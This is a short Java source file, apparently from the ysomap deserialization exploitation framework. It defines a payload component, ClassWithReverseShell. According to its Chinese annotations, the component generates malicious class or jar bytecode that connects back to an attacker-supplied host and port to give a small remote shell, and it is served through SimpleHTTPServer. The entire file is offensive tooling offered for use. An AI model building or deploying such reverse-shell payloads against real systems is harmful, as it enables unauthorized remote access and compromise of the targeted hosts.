package ysomap.bullets.objects;

import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ClassFiles;

/**
 * @author wh1t3P1g
 * @since 2020/10/28
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("用于生成恶意字节码（可对外发起Socket连接，小型shell），配合SimpleHTTPServer使用")
@Targets({Targets.CODE})
@Dependencies({"*"})
public class ClassWithReverseShell implements Bullet<byte[]> {

    @NotNull
    @Require(name = "classname", detail = "所需生成的类名")
    public String classname;

    @NotNull
    @Require(name = "rhost", detail = "远程监听ip")
    public String rhost;

    @NotNull
    @Require(name = "rport", detail = "远程监听端口")
    public String rport;

    @NotNull
    @Require(name = "type", detail = "所需生成的文件类型，支持class或jar")
    public String type = null;

    @Override
    public byte[] getObject() throws Exception {
        String code = "host=\""+rhost+"\";\nport="+rport+";";
        return ClassFiles.makeClassWithReverseShell(classname, code);
    }
}
